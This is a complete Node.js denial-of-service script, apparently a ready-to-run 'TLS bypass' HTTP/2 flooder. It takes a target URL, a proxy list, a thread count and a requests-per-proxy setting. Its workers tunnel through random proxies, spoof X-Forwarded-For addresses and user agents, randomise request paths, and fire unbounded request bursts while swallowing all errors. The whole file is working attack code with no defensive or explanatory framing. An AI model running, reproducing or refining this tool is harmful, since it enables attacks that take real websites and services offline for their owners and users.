const url = require("url"),
    fs = require("fs"),
    http = require("http"),
    http2 = require("http2"),
    tls = require("tls"),
    cluster = require("cluster"),
    fakeuseragent = require("fake-useragent");

const tls13 = [
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
    "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
];

tls.DEFAULT_MIN_VERSION = "TLSv1.3";
tls.DEFAULT_ECDH_CURVE = "auto";
tls.authorized = true;
tls.sync = true;

function randomCipher() {
    return tls13[Math.floor(Math.random() * tls13.length)];
}

function randomIp() {
    const ip = `${Math.floor(Math.random() * 255)}.${Math.floor(
        Math.random() * 255
    )}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;

    return isPrivate(ip) ? randomIp() : ip;
}

function isPrivate(ip) {
    return /^(10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[0-1]))/.test(ip);
}

function randStr() {
    const chars =
        "0123456789ABCDEFGHIJKLMNOPQRSTUVWXTZabcdefghiklmnopqrstuvwxyz";
    let string_length = 10;
    let randomstring = "";
    for (let i = 0; i < string_length; i++) {
        let rnum = Math.floor(Math.random() * chars.length);
        randomstring += chars.substring(rnum, rnum + 1);
    }
    return randomstring;
}

function Initialize(arguments) {
    process
        .on("uncaughtException", function (err) {})
        .on("unhandledRejection", function (err) {})
        .setMaxListeners(Infinity);

    var requestUA = fakeuseragent();
    setInterval(() => {
        const agent = new http.Agent({
            keepAlive: true,
            keepAliveMsecs: 10000,
            maxSockets: Infinity,
            maxTotalSockets: Infinity,
            maxSockets: Infinity,
        });

        var parsed = url.parse(arguments.target);
        var randIp = randomIp();
        var proxy =
            arguments.proxy[
                Math.floor(Math.random() * arguments.proxy.length)
            ].split(":");

        var FloodHeader = {
            ":scheme": "https",
            ":method": "GET",
            ":path": parsed.path.replace("%rand%", randStr()),

            "X-Forwarded-For": randIp,
            "User-Agent": requestUA,
            Accept: "*/*",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Cache-Control": "no-cache",
        };

        var h1connection = http.request(
            {
                host: proxy[0],
                agent: agent,
                globalAgent: agent,
                port: proxy[1],
                headers: {
                    Host: parsed.host,
                    "Proxy-Connection": "Keep-Alive",
                    Connection: "Keep-Alive",
                },
                method: "CONNECT",
                path: parsed.host + ":443",
            },
            function () {
                h1connection.setSocketKeepAlive(true);
            }
        );

        h1connection.end();

        h1connection.on("connect", (_, socket) => {
            const h2session = http2.connect(parsed.href, {
                createConnection: () => {
                    return tls.connect({
                        host: parsed.host,
                        ciphers: tls13.join(":"),
                        agent: agent,
                        secureProtocol: "TLS_method",
                        secureOptions:
                            tls.SSL_OP_NO_SSLv2 |
                            tls.SSL_OP_NO_SSLv3 |
                            tls.SSL_OP_NO_TLSv1 |
                            tls.SSL_OP_NO_TLSv1_1 |
                            tls.SSL_OP_NO_TLSv1_2,
                        port: 443,
                        servername: parsed.host,
                        maxRedirects: 10,
                        followAllRedirects: true,
                        curve: "GREASE:X25519:x25519",
                        secure: true,
                        rejectUnauthorized: false,
                        requestCert: true,
                        ALPNProtocols: ["h2", "http/1.1"],
                        sessionTimeout: 10000,
                        socket: socket,
                    });
                },
            });

            h2session.on("connect", (_, tlsSocket) => {
                tlsSocket.setNoDelay(true);
                tlsSocket.setKeepAlive(true, 10000);
                tlsSocket.setTimeout(10000);
                tlsSocket.setEncoding("utf8");

                for (let i = 0; i < arguments.rpp; i++) {
                    var h2req = h2session.request(FloodHeader);
                    h2req.on("response", (headers) => {});
                    h2req.on("data", (chunk) => {});
                    h2req.on("end", () => {
                        h2req.close();
                    });
                    h2req.end();
                }
            });
        });
    });
}

(async () => {
    if (process.argv.length !== 7) {
        console.log(
            `[!] Wrong number of arguments. Usage: node ${process.argv[1]} <target> <timeout> <proxy> <threads> <rpp ? request per proxy>`
        );
        process.exit(-1);
    }
    const args = {
        target: process.argv[2],
        time: process.argv[3],
        proxy: fs
            .readFileSync(process.argv[4], "utf-8")
            .toString()
            .match(/\S+/g),
        threads: process.argv[5],
        rpp: process.argv[6],
    };

    if (cluster.isMaster) {
        console.log(
            `[+] INITIALIZE FULL_TLS_BYPASS FLOOD | TARGET : ${args.target} | TIME : ${args.time} | PROXY : ${args.proxy.length} | THREADS : ${args.threads} | RPP : ${args.rpp}`
        );

        for (let i = 0; i < args.threads; i++) {
            cluster.fork();
        }

        setInterval(() => process.exit, args.time * 1000);
    } else {
        Initialize(args);
    }
})();
